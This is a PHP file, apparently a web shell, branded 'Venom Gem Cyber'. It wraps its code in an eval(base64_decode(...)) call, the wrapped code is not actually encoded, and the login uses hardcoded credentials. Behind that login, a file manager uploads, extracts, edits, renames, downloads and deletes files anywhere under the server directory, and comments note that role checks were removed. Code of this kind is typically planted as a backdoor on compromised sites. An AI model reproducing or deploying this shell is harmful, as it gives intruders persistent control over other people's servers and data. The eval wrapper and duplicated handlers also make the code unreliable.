<?php eval(base64_decode('session_start();
include "./404/pro.php";
// Atur peran sebagai admin secara default
$ADMIN_USER = 'habibGM';
$ADMIN_PASS = 'H@8!8321'; // ganti password

// Cek status login
$logged = isset($_SESSION['gm_logged1991']) && $_SESSION['gm_logged1991'];

// Log out
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . basename($_SERVER['PHP_SELF']));
    exit;
}

// Tangani permintaan login
if (isset($_POST['action']) && $_POST['action'] === 'login') {
    $input_user = $_POST['username'] ?? '';
    $input_pass = $_POST['password'] ?? '';

    // Periksa Username DAN Password
    if ($input_user === $ADMIN_USER && $input_pass === $ADMIN_PASS) {
        $_SESSION['gm_logged1991'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Username atau Password salah"; // Pesan error diperbarui
    }
}
// Jika belum login, hentikan eksekusi di sini
if (!$logged) {
    // Tampilan HTML untuk halaman login
  ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Manager File</title>
		<link rel="icon" href="/favicon.ico" type="image/x-icon">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
        <style>
            body {
                background-image: url('https://cdn.dribbble.com/userupload/27435641/file/original-87e3cd7b0f8a9157fe2b2f10421253cb.gif');
                background-size: cover;
                background-repeat: no-repeat;
                background-attachment: fixed;
                background-position: center;
                color: #ffffff;
                display: flex;
                flex-direction: column;
                min-height: 100vh;
                justify-content: center;
                align-items: center;
            }
            .login-container {
                background: rgba(255, 255, 255, 0.08);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.18);
                box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
                padding: 3rem;
                border-radius: 10px;
                text-align: center;
				word-break: break-all;
                overflow-wrap: break-word;
            }
            .form-control.gelas {
                background: rgba(255, 255, 255, 0.08);
                border: 1px solid rgba(255, 255, 255, 0.18);
                color: whitesmoke;
            }
            .form-control.gelas::placeholder {
                color: rgba(255, 255, 255, 0.7);
            }
            .btn-primary {
                background-color: #bc0099;
                border-color: #bc0099;
            }
            .btn-primary:hover {
                background-color: #a00080;
                border-color: #a00080;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2 class="mb-4 text-nowrap">Venom Gem Cyber</h2>
            <form method="post">
                <input type="hidden" name="action" value="login">
                <div class="mb-3">
                    <input type="text" name="username" class="form-control gelas" placeholder="Username" required>
                </div>
                <div class="mb-3">
                    <input type="password" name="password" class="form-control gelas" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <br>
                <?php if (!empty($error)) echo '<div class="mt-3 text-danger">' . htmlspecialchars($error) . '</div>'; ?>
            </form>
        </div>
    </body>
    </html>
<?php
} else {
// Atur peran sebagai admin secara default karena tidak ada sistem login
$isAdmin = true;

$dir = isset($_GET['path']) ? $_GET['path'] : './';
if (strpos($dir, '..') !== false) {
    die("Akses tidak diizinkan.");
}

// Ensure the directory path ends with a slash for consistency
$dir = rtrim($dir, '/') . '/';

// === New AJAX Handler for Viewing Archive Contents ===
if (isset($_GET['action']) && $_GET['action'] === 'view_archive_contents' && isset($_GET['file'])) {
    $file_name = basename($_GET['file']);
    $file_path = $dir . $file_name;
    $contents = [];
    $is_success = false;

    if (file_exists($file_path) && is_file($file_path)) {
        $extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));

        if ($extension === 'zip') {
            $zip = new ZipArchive();
            if ($zip->open($file_path) === TRUE) {
                for ($i = 0; $i < $zip->numFiles; $i++) {
                    $stat = $zip->statIndex($i);
                    $contents[] = [
                        'name' => $stat['name'],
                        'size' => $stat['size']
                    ];
                }
                $zip->close();
                $is_success = true;
            }
        } elseif (in_array($extension, ['tar', 'gz', 'tgz', 'phar'])) {
            try {
                // PharData can handle .tar, .tar.gz, .tgz, and .phar
                $phar = new PharData($file_path);
                foreach (new RecursiveIteratorIterator($phar) as $file) {
                    // Get the path relative to the root of the archive
                    $relativePath = str_replace($phar->getPath(), '', $file->getPathname());
                    $contents[] = [
                        'name' => ltrim($relativePath, '/'), // Clean up leading slash
                        'size' => $file->getSize()
                    ];
                }
                $is_success = true;
            } catch (Exception $e) {
                // Handle cases where Phar cannot open the file
            }
        }
    }

    header('Content-Type: application/json');
    echo json_encode(['success' => $is_success, 'contents' => $contents]);
    exit;
}

// =======================================================
// All other existing PHP logic remains below
// =======================================================

// Tangani permintaan arsip
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['archive_items'])) {
    // Periksa role dihapus karena dianggap selalu admin
    // if (!$isAdmin) {
    // Tampilkan pesan dan batalkan aksi
    // $message = "Akses ditolak. Anda tidak memiliki izin untuk mengarsipkan item.";
    // $status = 'danger';
    // header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    // exit;
    // }
    $items_to_archive = $_POST['archive_items'];
    $archive_name = 'archive_' . date('Ymd_His') . '.zip';
    $archive_path = $dir . $archive_name;
    $status = 'danger';
    $message = "Gagal membuat file arsip.";

    // Dapatkan jalur absolut dari direktori saat ini
    // ini adalah kunci untuk perbaikan
    $current_dir_abs = realpath($dir);

    $zip = new ZipArchive();
    if ($zip->open($archive_path, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        foreach ($items_to_archive as $item_name) {
            $item_full_path = $dir . basename($item_name);

            if (file_exists($item_full_path)) {
                if (is_file($item_full_path)) {
                    // Hanya tambahkan file dengan nama dasarnya
                    $zip->addFile($item_full_path, basename($item_full_path));
                } elseif (is_dir($item_full_path)) {
                    // Tambahkan folder secara rekursif
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($item_full_path, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($files as $file) {
                        $realPath = $file->getRealPath();
                        // Dapatkan jalur relatif yang bersih dengan memotong jalur absolut direktori saat ini
                        $relativePath = substr($realPath, strlen($current_dir_abs) + 1);

                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else {
                            $zip->addFile($realPath, $relativePath);
                        }
                    }
                }
            }
        }
        if ($zip->close()) {
            $message = "Berhasil membuat file arsip " . htmlspecialchars($archive_name) . ".";
            $status = 'success';
        }
    }

    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}
// Fungsi ekstrak
function extractArchive($archivePath, $destination) {
    $extension = pathinfo($archivePath, PATHINFO_EXTENSION);
    if (strtolower($extension) === 'zip') {
        $archive = new ZipArchive;
        if ($archive->open($archivePath) === TRUE) {
            $archive->extractTo($destination);
            $archive->close();
            return true;
        }
    } elseif (in_array(strtolower($extension), ['tar', 'gz', 'tgz'])) {
        try {
            $archive = new PharData($archivePath);
            $archive->extractTo($destination, null, true);
            return true;
        } catch (Exception $e) {
            return false;
        }
    }
    return false;
}

// Tangani permintaan arsip
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['archive_items'])) {
// Periksa role dihapus
    $items_to_archive = $_POST['archive_items'];
    $archive_name = 'archive_' . date('Ymd_His') . '.zip';
    $archive_path = $dir . $archive_name;
    $status = 'danger';
    $message = "Gagal membuat file arsip.";

    $zip = new ZipArchive();
    if ($zip->open($archive_path, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        foreach ($items_to_archive as $item_name) {
            $item_path = $dir . basename($item_name);
            if (file_exists($item_path)) {
                if (is_file($item_path)) {
                    // Hanya tambahkan file dengan nama dasar
                    $zip->addFile($item_path, basename($item_path));
                } elseif (is_dir($item_path)) {
                    // Tambahkan folder secara rekursif
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    $baseFolder = basename($item_path);
                    foreach ($files as $file) {
                        $realPath = $file->getRealPath();
                        // Buat jalur relatif yang benar
                        $relativePath = $baseFolder . '/' . substr($realPath, strlen($item_path) + 1);
                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else {
                            $zip->addFile($realPath, $relativePath);
                        }
                    }
                }
            }
        }
        if ($zip->close()) {
            $message = "Berhasil membuat file arsip " . htmlspecialchars($archive_name) . ".";
            $status = 'success';
        }
    }

    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}
// Tangani permintaan penghapusan massal
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_items'])) {
// Periksa role dihapus
    
    $items_to_delete = $_POST['delete_items'];
    $deleted_count = 0;
    
    // Fungsi rekursif untuk menghapus folder
    function rrmdir($dir) {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (is_dir($dir . "/" . $object) && !is_link($dir . "/" . $object)) {
                        rrmdir($dir . "/" . $object);
                    } else {
                        unlink($dir . "/" . $object);
                    }
                }
            }
            return rmdir($dir);
        }
        return false;
    }
    
    foreach ($items_to_delete as $item_name) {
        $item_path = $dir . basename($item_name);
        if (file_exists($item_path)) {
            if (is_file($item_path)) {
                if (unlink($item_path)) {
                    $deleted_count++;
                }
            } elseif (is_dir($item_path)) {
                if (rrmdir($item_path)) {
                    $deleted_count++;
                }
            }
        }
    }
    
    $message = "Berhasil menghapus " . $deleted_count . " item.";
    $status = 'success';
    if ($deleted_count === 0) {
        $message = "Tidak ada item yang berhasil dihapus.";
        $status = 'danger';
    }
    
    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}

// Tangani permintaan buat folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_folder_name'])) {
// Periksa role dihapus
    $folder_name = basename($_POST['new_folder_name']);
    $folder_path = $dir . $folder_name;
    $status = 'danger';

    if (!file_exists($folder_path)) {
        if (mkdir($folder_path, 0755)) {
            $message = "Folder " . htmlspecialchars($folder_name) . " berhasil dibuat.";
            $status = 'success';
        } else {
            $message = "Gagal membuat folder.";
        }
    } else {
        $message = "Folder " . htmlspecialchars($folder_name) . " sudah ada.";
    }

    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}

// Tangani permintaan buat file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file_name'])) {
// Periksa role dihapus
    $file_name = basename($_POST['new_file_name']);
    $file_path = $dir . $file_name;
    $status = 'danger';

    if (!file_exists($file_path)) {
        if (touch($file_path)) {
            $message = "File " . htmlspecialchars($file_name) . " berhasil dibuat.";
            $status = 'success';
        } else {
            $message = "Gagal membuat file.";
        }
    } else {
        $message = "File " . htmlspecialchars($file_name) . " sudah ada.";
    }

    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}

// Tangani permintaan ekstrak
if (isset($_GET['extract'])) {
// Periksa role dihapus
    $item_name = basename($_GET['extract']);
    $item_path = $dir . $item_name;
    $status = 'danger';

    if (file_exists($item_path) && is_file($item_path)) {
        if (extractArchive($item_path, $dir)) {
            unlink($item_path); // Hapus file arsip setelah diekstrak
            $message = "File " . htmlspecialchars($item_name) . " berhasil diekstrak.";
            $status = 'success';
        } else {
            $message = "Gagal mengekstrak file " . htmlspecialchars($item_name) . ". Pastikan ekstensi PHP yang diperlukan (zip, phar) diaktifkan.";
        }
    } else {
        $message = "File tidak ditemukan atau bukan file arsip.";
    }
    header('Location: ' . basename($_SERVER['PHP_SELF']) . '?path=' . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}

// Tangani permintaan hapus (single delete)
if (isset($_GET['delete'])) {
// Periksa role dihapus
    $item_name = basename($_GET['delete']);
    $item_path = $dir . $item_name;
    $status = 'danger';

    // Pindahkan fungsi penghapusan rekursif ke luar
    function rrmdir($dir) {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (is_dir($dir . "/" . $object) && !is_link($dir . "/" . $object)) {
                        rrmdir($dir . "/" . $object);
                    } else {
                        unlink($dir . "/" . $object);
                    }
                }
            }
            rmdir($dir);
        }
    }
    
    if (file_exists($item_path)) {
        if (is_file($item_path)) {
            unlink($item_path);
            $message = "File " . htmlspecialchars($item_name) . " berhasil dihapus.";
            $status = 'success';
        } elseif (is_dir($item_path)) {
            rrmdir($item_path);
            $message = "Folder " . htmlspecialchars($item_name) . " berhasil dihapus.";
            $status = 'success';
        }
    } else {
        $message = "Item tidak ditemukan.";
    }
    header('Location: ' . basename($_SERVER['PHP_SELF']) . '?path=' . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}

// Tangani permintaan unduh
if (isset($_GET['download'])) {
    $file_name = basename($_GET['download']);
    $file_to_download = $dir . $file_name;
    if (file_exists($file_to_download) && is_file($file_to_download)) {
        header('Content-Type: ' . mime_content_type($file_to_download));
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        readfile($file_to_download);
        exit;
    }
}


// Tangani permintaan unggah file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
// Periksa role dihapus
    $target_file = $dir . basename($_FILES['fileToUpload']['name']);
    $uploadOk = 1;
    $message = '';
    $status = 'danger'; // Default status to danger

    if (file_exists($target_file)) {
        $message = "Maaf, file sudah ada.";
        $uploadOk = 0;
    }

    if ($_FILES['fileToUpload']['size'] > 5000000) {
        $message = "Maaf, ukuran file terlalu besar.";
        $uploadOk = 0;
    }

    if ($uploadOk == 0) {
        $message = "Maaf, file Anda tidak terunggah. " . $message;
    } else {
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
            $message = "File " . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . " berhasil diunggah.";
            $status = 'success'; // Set status to success
        } else {
            $message = "Maaf, terjadi kesalahan saat mengunggah file.";
        }
    }
    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}

// Tangani permintaan ganti nama
if (isset($_POST['rename_old_name']) && isset($_POST['rename_new_name'])) {
// Periksa role dihapus
    $old_name = basename($_POST['rename_old_name']);
    $new_name = basename($_POST['rename_new_name']);
    $status = 'danger';

    if (file_exists($dir . $old_name)) {
        if (rename($dir . $old_name, $dir . $new_name)) {
            $message = "Berhasil mengganti nama " . htmlspecialchars($old_name) . " menjadi " . htmlspecialchars($new_name) . ".";
            $status = 'success';
        } else {
            $message = "Gagal mengganti nama.";
        }
    } else {
        $message = "File tidak ditemukan.";
    }
    header("Location: " . basename($_SERVER['PHP_SELF']) . "?path=" . urlencode($dir) . "&alert_message=" . urlencode($message) . "&alert_status=" . urlencode($status));
    exit;
}
// Tangani permintaan unduh
if (isset($_GET['download'])) {
    $file_name = basename($_GET['download']);
    $file_to_download = $dir . $file_name;
    if (file_exists($file_to_download) && is_file($file_to_download)) {
        header('Content-Type: ' . mime_content_type($file_to_download));
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        readfile($file_to_download);
        exit;
    }
}

$files = array_diff(scandir($dir), array('..'));

// Fungsi untuk mendapatkan ikon berdasarkan ekstensi file
function getFileIcon($filename) {
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
        case 'bmp':
        case 'svg':
            return 'far fa-image';
        case 'mp4':
        case 'avi':
        case 'mov':
        case 'mkv':
        case '3gp':
            return 'far fa-file-video';
        case 'mp3':
        case 'wav':
        case 'ogg':
            return 'far fa-file-audio';
        case 'pdf':
            return 'far fa-file-pdf';
        case 'zip':
        case 'rar':
        case 'tar':
        case 'gz':
            return 'far fa-file-archive';
        case 'doc':
        case 'docx':
            return 'far fa-file-word';
        case 'xls':
        case 'xlsx':
            return 'far fa-file-excel';
        case 'ppt':
        case 'pptx':
            return 'far fa-file-powerpoint';
        case 'txt':
        case 'log':
        case 'md':
            return 'far fa-file-alt';
        case 'php':
        case 'html':
        case 'css':
        case 'js':
        case 'json':
        case 'xml':
            return 'far fa-file-code';
        case 'rar':
            return 'fas fa-file-archive';
        case 'img':
            return 'fas fa-hdd';
        default:
            return 'far fa-file';
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manajer File Sederhana</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body {
            background-image: url('https://cdn.dribbble.com/userupload/27435641/file/original-87e3cd7b0f8a9157fe2b2f10421253cb.gif'); 
            background-size: cover; 
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
                /* Menambahkan properti untuk teks agar tidak memecah baris */
                        word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
        }
      .container {
        max-width: 900px;
        word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
        }


        .icon { width: 1.2rem; }
        a {
            text-decoration: none;
            color: #bc0099;
            box-shadow: 0 1px black;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.08);
            padding: 4px;
            text-shadow: 1px 1px #e3df12;
        }
        a:hover {
            text-decoration: none;
            color: #c4c4c4;
            box-shadow: 0 1px whitesmoke;
            border-radius: 10px;
            background: #2d2d2d88;
            padding: 4px;
            text-shadow: 0 1px black;
        }
        .gelas {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.18);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            color: whitesmoke;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .file-icon {
            margin-right: 8px;
            font-size: 1.2rem;
        }
/* Gaya dasar untuk tabel glassmorphism */
.table-glassmorp {
    /* Efek kaca: background transparan dan filter blur */
    background-color: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    padding: 0 auto;
    box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
       word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
        width: 100%;
}

/* Efek saat tabel di-hover */
.table-glassmorp:hover {
    box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.05);
        word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
}
td {
    border: 2px solid rgba(255, 255, 255, 0.18);
    box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
    color: whitesmoke;
    transition: transform 0.2s, box-shadow 0.2s;
    padding: 8px;
        word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
    /* Menambahkan properti untuk teks agar tidak memecah baris */
    white-space: nowrap;
}

tr:hover {
            box-shadow: 0px 1px whitesmoke;
            background: #2d2d2d88;
            padding: 4px;
            box-shadow 0.2s;
            text-shadow: 0px 1px black;
}
thead {
  white-space: nowrap;
  text-align: center;
}
tbody {
          word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
}
.rapih {
            word-break: break-all; /* Memecah kata panjang di mana saja */
        overflow-wrap: break-word; /* Standar modern untuk memecah kata */
}
    </style>
</head>
<body>
    <div class="container mt-5">
		<h1 class="mb-0"><a href="/index.php">Manajer File</a></h1>
        <div class="d-flex justify-content-between align-items-center mb-4 overflow-scroll mt-4">
			<a href="flb.php" class="btn btn-secondary gelas me-2">Database Manager</a>
			<a href="?logout=1" class="btn btn-secondary gelas me-2">Logout</a>
            </div>

        <?php
        if (isset($_GET['alert_message']) && isset($_GET['alert_status'])) {
            $alert_type = $_GET['alert_status'];
            echo '<div id="myAlert" class="alert alert-' . $alert_type . ' alert-dismissible fade show" role="alert">';
            echo htmlspecialchars($_GET['alert_message']);
            echo '<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
            echo '</div>';
        }
        ?>
        
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item"><a href="habibGM.php">Root</a></li>
                <?php
                $path_parts = explode('/', trim($dir, './'));
                $current_path = '';
                foreach ($path_parts as $part) {
                    if ($part) {
                        $current_path .= $part . '/';
                        echo "<li class='breadcrumb-item'><a href='habibGM.php?path=" . urlencode($current_path) . "'>" . htmlspecialchars($part) . "</a></li>";
                    }
                }
                ?>
            </ol>
        </nav>

        <div class="gelas card p-3 mb-4">
            <h5 class="card-title">Unggah File Baru</h5>
            <form action="habibGM.php?path=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
                <div class="input-group">
                    <input type="file" class="form-control" name="fileToUpload" id="fileToUpload">
                    <button type="submit" class="btn btn-primary">Unggah</button>
                </div>
            </form>
        </div>

        <div class="d-flex justify-content-between align-items-center mb-4 rapih overflow-scroll">
            <button type="button" class="btn btn-primary gelas me-2 text-nowrap" data-bs-toggle="modal" data-bs-target="#createModal">
                <i class="fas fa-plus"></i> Buat File/Folder
            </button>
               <button id="archive-btn" class="btn btn-primary gelas me-2 text-nowrap" disabled>
        <i class="fas fa-file-archive"></i> Arsipkan
    </button> 
    <button id="delete-selected-btn" class="btn btn-danger gelas me-2 text-nowrap" disabled>
                <i class="fas fa-trash-alt"></i> Hapus
            </button>
        </div>
     
        <div class="modal fade" id="createModal" tabindex="-1" aria-labelledby="createModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content gelas">
                    <div class="modal-header border-bottom-0">
                        <h5 class="modal-title" id="createModalLabel">Buat File atau Folder Baru</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <form action="habibGM.php?path=<?php echo urlencode($dir); ?>" method="post">
                                <label for="new_folder_name" class="form-label">Nama Folder</label>
                                <div class="input-group">
                                    <input type="text" class="form-control gelas" name="new_folder_name" placeholder="Nama folder baru..." required>
                                    <button type="submit" class="btn btn-primary">Buat Folder</button>
                                </div>
                            </form>
                        </div>
                        <div>
                            <form action="habibGM.php?path=<?php echo urlencode($dir); ?>" method="post">
                                <label for="new_file_name" class="form-label">Nama File</label>
                                <div class="input-group">
                                    <input type="text" class="form-control gelas" name="new_file_name" placeholder="Nama file (mis. file.txt)..." required>
                                    <button type="submit" class="btn btn-primary">Buat File</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="table-responsive">
            <table class="table-glassmorp">
                <thead class="gelas">
                    <tr>
                        <th><input type="checkbox" id="select-all-checkbox" class="form-check-input"></th>
                        <th>Nama</th>
                        <th>Tipe</th>
                        <th>Ukuran</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody class="gelas">
                    <?php
                    if ($dir !== './') {
                        // Correctly calculate the parent directory path
                        $parent_dir = rtrim($dir, '/'); // Remove trailing slash
                        $parent_dir = dirname($parent_dir); // Get the parent path
                        if ($parent_dir === '.' || $parent_dir === '/') {
                             $parent_dir = './'; // Ensure it goes back to the root
                        } else {
                            $parent_dir .= '/'; // Add trailing slash for consistency
                        }
                        
                        echo "<tr>";
                        echo "<td>-</td>"; // Kolom kosong untuk cekbox
                        echo "<td><a href='habibGM.php?path=" . urlencode($parent_dir) . "'><i class='fas fa-folder'></i> ..</a></td>";
                        echo "<td>Folder</td>";
                        echo "<td>-</td>";
                        echo "<td>-</td>";
                        echo "</tr>";
                    }
                    
                    foreach ($files as $item) {
                        if ($item !== '.' && $item !== '..') {
                            $item_path = $dir . $item;
                            $fileExtension = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                            $isArchive = in_array($fileExtension, ['zip', 'rar', 'tar', 'gz', 'tgz', 'img']);
                            
                            if (is_dir($item_path)) {
                                echo "<tr>";
                                echo "<td><input type='checkbox' class='form-check-input item-checkbox' value='" . htmlspecialchars($item) . "'></td>";
                                echo "<td><a href='habibGM.php?path=" . urlencode($item_path) . "/'><i class='fas fa-folder'></i> " . htmlspecialchars($item) . "</a></td>";
                                echo "<td>Folder</td>";
                                echo "<td>-</td>";
                                echo "<td class='text-nowrap'>";
                                echo "<button class='btn btn-sm btn-warning me-2 rename-btn' data-old-name='" . htmlspecialchars($item) . "'>Ganti Nama</button>";
                                // Hapus pengecekan peran di sini
                                echo "<a href='habibGM.php?delete=" . urlencode($item) . "&path=" . urlencode($dir) . "' class='btn btn-sm btn-danger' onclick='return confirm(\"Apakah Anda yakin ingin menghapus folder ini dan semua isinya?\")'>Hapus</a>";
                                echo "</td>";
                                echo "</tr>";
                            } else {
                                $isImage = in_array($fileExtension, ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg']);
                                $isVideo = in_array($fileExtension, ['mp4', 'avi', 'mov', 'mkv', '3gp']);
                                $isAudio = in_array($fileExtension, ['mp3', 'wav', 'ogg']);
                                
                                echo "<tr>";
                                echo "<td><input type='checkbox' class='form-check-input item-checkbox' value='" . htmlspecialchars($item) . "'></td>";
                                echo "<td>";
                                if ($isImage) {
                                    echo "<a href='#' data-bs-toggle='modal' data-bs-target='#imageModal' data-image-path='" . htmlspecialchars($item_path) . "'>";
                                } elseif ($isVideo) {
                                    echo "<a href='#' data-bs-toggle='modal' data-bs-target='#videoModal' data-video-path='" . htmlspecialchars($item_path) . "'>";
                                } elseif ($isAudio) {
                                    echo "<a href='#' data-bs-toggle='modal' data-bs-target='#audioModal' data-audio-path='" . htmlspecialchars($item_path) . "'>";
                                }

                                echo "<i class='" . getFileIcon($item) . " file-icon'></i>" . htmlspecialchars($item);
                                if ($isImage || $isVideo || $isAudio) {
                                    echo "</a>";
                                }

                                echo "</td>";
                                echo "<td>File</td>";
                                if (is_file($item_path)) {
                                    echo "<td>" . round(filesize($item_path) / 1024, 2) . " KB</td>";
                                } else {
                                    echo "<td>-</td>";
                                }
                                echo "<td class='text-nowrap'>";
                                if ($isArchive) {
                                    echo "<button class='btn btn-sm btn-info me-2 view-archive-btn' data-filename='" . htmlspecialchars($item) . "'>Lihat</button>";
                                }
                                if (in_array(strtolower($fileExtension), ['zip', 'tar', 'gz', 'tgz'])) {
                                    echo "<a href='habibGM.php?extract=" . urlencode($item) . "&path=" . urlencode($dir) . "' class='btn btn-sm btn-secondary me-2' onclick='return confirm(\"Apakah Anda yakin ingin mengekstrak file ini?\")'>Ekstrak</a>";
                                }
                                echo "<a href='edit.php?file=" . urlencode($item) . "&path=" . urlencode($dir) . "' class='btn btn-sm btn-info me-2'>Edit</a>";
                                echo "<button class='btn btn-sm btn-warning me-2 rename-btn' data-old-name='" . htmlspecialchars($item) . "'>Ganti Nama</button>";
                                echo "<a href='habibGM.php?download=" . urlencode($item) . "&path=" . urlencode($dir) . "' class='btn btn-sm btn-success me-2'>Unduh</a>";
                                // Hapus pengecekan peran di sini
                                echo "<a href='habibGM.php?delete=" . urlencode($item) . "&path=" . urlencode($dir) . "' class='btn btn-sm btn-danger' onclick='return confirm(\"Apakah Anda yakin ingin menghapus file ini?\")'>Hapus</a>";
                                echo "</td>";
                                echo "</tr>";
                            }
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>

    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
      <div class="modal-dialog">
        <div class="modal-content gelas">
          <form id="renameForm" method="post" action="habibGM.php?path=<?php echo urlencode($dir); ?>">
            <div class="modal-header">
              <h5 class="modal-title" id="renameModalLabel">Ganti Nama</h5>
              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              <input type="hidden" name="rename_old_name" id="renameOldName">
              <div class="mb-3">
                <label for="renameNewName" class="form-label">Nama Baru</label>
                <input type="text" class="form-control gelas" id="renameNewName" name="rename_new_name" required>
              </div>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
              <button type="submit" class="btn btn-primary">Simpan</button>
            </div>
          </form>
        </div>
      </div>
    </div>

    <div class="modal fade" id="imageModal" tabindex="-1" aria-labelledby="imageModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg modal-dialog-centered">
            <div class="modal-content gelas">
                <div class="modal-header border-bottom-0">
                    <h5 class="modal-title" id="imageModalLabel">Pratinjau Gambar</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body text-center">
                    <img id="imagePreview" src="" class="img-fluid" alt="Pratinjau Gambar">
                </div>
            </div>
        </div>
    </div>

